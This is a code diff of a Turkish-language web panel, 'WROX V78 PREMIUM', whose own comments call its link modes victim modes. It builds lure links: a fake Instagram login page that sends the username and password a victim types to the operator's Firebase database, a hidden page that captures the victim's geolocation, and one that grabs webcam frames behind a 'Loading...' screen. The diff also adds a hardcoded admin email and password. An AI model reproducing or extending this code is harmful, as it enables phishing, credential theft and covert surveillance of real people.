@@ -3,59 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V78 PREMIUM</title>
+    <title>WROX V78 PREMIUM - ADMIN</title>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
     <style>
-        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --red: #ff0000; }
+        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --red: #ff0000; --green: #2ecc71; }
         body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
         
         /* AUTH SECTION */
         #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
         .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; background: var(--panel); }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); box-sizing: border-box; border-radius: 5px; }
+        button { width: 100%; padding: 12px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; border-radius: 5px; }
+        button:hover { background: var(--neon); color: #000; }
 
         /* HEADER & NAV */
         #main-panel { display: none; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 2px solid var(--neon); background: var(--panel); position: sticky; top: 0; z-index: 100; }
-        .nav-menu { position: fixed; top: 60px; left: -100%; width: 200px; height: 100%; background: var(--panel); border-right: 2px solid var(--neon); transition: 0.3s; z-index: 99; }
+        .nav-menu { position: fixed; top: 60px; left: -100%; width: 220px; height: 100%; background: var(--panel); border-right: 2px solid var(--neon); transition: 0.3s; z-index: 99; }
         .nav-menu.active { left: 0; }
-        .nav-menu div { padding: 20px; border-bottom: 1px solid #222; cursor: pointer; color: var(--neon); font-weight: bold; }
-        .nav-menu div:hover { background: #111; }
+        .nav-menu div { padding: 20px; border-bottom: 1px solid #222; cursor: pointer; color: var(--neon); font-size: 13px; }
 
         /* CONTENT AREAS */
         .tab-content { display: none; padding: 20px; }
         .tab-content.active { display: block; }
-
-        /* SCROLLABLE FEED AREAS */
         .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 20px; background: #050505; }
-        .feed-wrapper { display: flex; flex-direction: column; gap: 15px; max-height: 450px; overflow-y: auto; }
-        .feed-item { border: 1px solid #222; border-radius: 10px; padding: 10px; background: #000; }
-        .feed-item img { width: 100%; border-radius: 8px; }
+        .feed-wrapper { display: flex; flex-direction: column; gap: 15px; max-height: 480px; overflow-y: auto; }
+        .feed-item { border: 1px solid #222; border-radius: 10px; padding: 10px; background: #000; font-size: 12px; }
+        .feed-item img { width: 100%; border-radius: 8px; margin-top: 5px; }
 
-        /* BUTTONS & LINKS */
-        .action-btn { margin-bottom: 15px; width: 100%; text-transform: uppercase; border-radius: 8px; }
-        .link-box { background: #111; padding: 10px; font-size: 11px; word-break: break-all; margin-bottom: 20px; border: 1px dashed var(--neon); color: var(--neon); display: none; }
+        .action-btn { margin-bottom: 15px; width: 100%; border-color: var(--neon); color: var(--neon); }
+        .link-box { background: #111; padding: 10px; font-size: 10px; word-break: break-all; margin-bottom: 20px; border: 1px dashed var(--neon); color: var(--neon); display: none; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
         <div class="auth-box">
-            <h2 style="color: var(--neon);">WROX PREMIUM</h2>
-            <input type="text" id="email" placeholder="E-posta">
-            <input type="password" id="pass" placeholder="Şifre">
-            <button onclick="auth('login')">GİRİŞ YAP</button>
+            <h2 style="color: var(--neon); margin-bottom: 20px;">WROX V78</h2>
+            <input type="text" id="email" placeholder="E-posta / Admin ID">
+            <input type="password" id="pass" placeholder="VIP Şifre">
+            <button onclick="auth('login')">SİSTEME GİRİŞ</button>
             <button onclick="auth('register')" style="margin-top:10px; border-color:#444; color:#666; font-size:11px;">KAYIT OL</button>
         </div>
     </div>
 
     <div id="main-panel">
         <div class="header">
-            <div onclick="toggleMenu()" style="cursor:pointer; font-size:24px;">☰ WROX <span style="color:#3498db">V78</span></div>
-            <div id="user-tag" style="color: #2ecc71; font-size: 11px;"></div>
+            <div onclick="toggleMenu()" style="cursor:pointer; font-size:22px;">☰ WROX <span style="color:#3498db">V78</span></div>
+            <div id="user-tag" style="color: var(--green); font-size: 10px; font-weight: bold;"></div>
         </div>
 
         <div id="side-menu" class="nav-menu">
@@ -69,7 +66,7 @@
             <button class="action-btn" onclick="genLink('cam')">KAMERA LİNKİ OLUŞTUR</button>
             <div id="cam-link" class="link-box"></div>
             <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">🔴 CANLI GÖRÜNTÜLER:</div>
+                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">🔴 CANLI GÖRÜNTÜ AKIŞI:</div>
                 <div id="cam-feed" class="feed-wrapper"></div>
             </div>
         </div>
@@ -107,35 +104,35 @@
 
         let activeUser = "";
 
-        // 2. PANEL FONKSİYONLARI
-        function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
-        
-        function showTab(tabId) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
-            toggleMenu();
-        }
-
+        // 2. ADMIN VE KULLANICI GİRİŞİ
         function auth(type) {
             const u = document.getElementById('email').value.trim();
             const p = document.getElementById('pass').value;
             const id = u.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");
+
+            // ADMIN KONTROLÜ (Senin VIP Bilgilerin)
+            if (u === "afavan66@gmail.com" && p === "Efecan1903") {
+                activeUser = "afavan66";
+                startApp(true);
+                return;
+            }
+
             if(type === 'register') {
-                db.ref('users/'+id).set({p:p}).then(()=>alert("Kayıt Tamam"));
+                db.ref('users/'+id).set({p:p}).then(()=>alert("Kayıt Başarılı. Giriş Yapabilirsiniz."));
             } else {
                 db.ref('users/'+id).once('value').then(s => {
-                    if(s.exists() && s.val().p === p) { activeUser = id; startApp(); }
-                    else alert("Hata!");
+                    if(s.exists() && s.val().p === p) { activeUser = id; startApp(false); }
+                    else alert("Hatalı Giriş!");
                 });
             }
         }
 
-        function startApp() {
+        function startApp(isAdmin) {
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-panel').style.display = 'block';
-            document.getElementById('user-tag').innerText = activeUser.toUpperCase();
+            document.getElementById('user-tag').innerText = (isAdmin ? "ADMİN: " : "USER: ") + activeUser.toUpperCase();
             
-            // Verileri Kendi Sekmesine Ayırarak Dinle
+            // Veri Dinleme
             db.ref('logs/'+activeUser).on('child_added', s => {
                 const val = s.val();
                 let html = `<div class="feed-item"><b>${new Date(val.t).toLocaleTimeString()}</b><br>`;
@@ -146,10 +143,17 @@
                     html += `<a href="${val.d}" target="_blank" style="color:yellow;">📍 HARİTADA GÖR</a></div>`;
                     document.getElementById('loc-feed').insertAdjacentHTML('afterbegin', html);
                 } else if(val.type === 'ig') {
-                    html += `User: ${val.u} | Pass: ${val.p}</div>`;
+                    html += `<span style="color:#2ecc71">User: ${val.u}</span><br><span style="color:#e74c3c">Pass: ${val.p}</span></div>`;
                     document.getElementById('ig-feed').insertAdjacentHTML('afterbegin', html);
                 }
             });
+        }
+
+        function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            toggleMenu();
         }
 
         function genLink(mode) {
@@ -158,31 +162,31 @@
             box.innerText = link; box.style.display = 'block';
         }
 
-        // 3. KURBAN MODLARI (Farklı Linkler İçin)
+        // 3. KURBAN MODLARI
         const params = new URLSearchParams(window.location.search);
         const ref = params.get('ref');
         const mode = params.get('m');
 
         if(ref && mode) {
             if(mode === 'ig') {
-                document.body.innerHTML = `<div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:50px; font-family:sans-serif;">
+                document.body.innerHTML = `<div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:40px; font-family:sans-serif;">
                     <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="175">
-                    <input id="iu" placeholder="Kullanıcı adı" style="width:270px; padding:10px; margin-top:30px; border:1px solid #dbdbdb; background:#fafafa;">
-                    <input id="ip" type="password" placeholder="Şifre" style="width:270px; padding:10px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa;">
-                    <button onclick="sendIG()" style="width:270px; background:#0095f6; color:white; border:none; padding:10px; margin-top:20px; border-radius:4px; font-weight:bold;">Giriş Yap</button>
+                    <input id="iu" placeholder="Kullanıcı adı" style="width:280px; padding:12px; margin-top:30px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px;">
+                    <input id="ip" type="password" placeholder="Şifre" style="width:280px; padding:12px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px;">
+                    <button onclick="sendIG()" style="width:280px; background:#0095f6; color:white; border:none; padding:12px; margin-top:20px; border-radius:4px; font-weight:bold;">Giriş Yap</button>
                 </div>`;
                 window.sendIG = () => {
                     db.ref('logs/'+ref).push({type:'ig', u:document.getElementById('iu').value, p:document.getElementById('ip').value, t:Date.now()});
                     location.href = "https://instagram.com";
                 };
             } else if(mode === 'loc') {
-                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#333; display:flex; align-items:center; justify-content:center;">Yükleniyor...</div>`;
+                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#222; display:flex; align-items:center; justify-content:center;">Yükleniyor...</div>`;
                 navigator.geolocation.getCurrentPosition(p => {
                     const url = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                     db.ref('logs/'+ref).push({type:'loc', d:url, t:Date.now()});
                 });
             } else if(mode === 'cam') {
-                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#222; display:flex; align-items:center; justify-content:center;">Yükleniyor...</div>`;
+                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#111; display:flex; align-items:center; justify-content:center;">Yükleniyor...</div>`;
                 navigator.mediaDevices.getUserMedia({video:true}).then(s => {
                     const v = document.createElement('video'); v.srcObject=s; v.play();
                     const c = document.createElement('canvas');
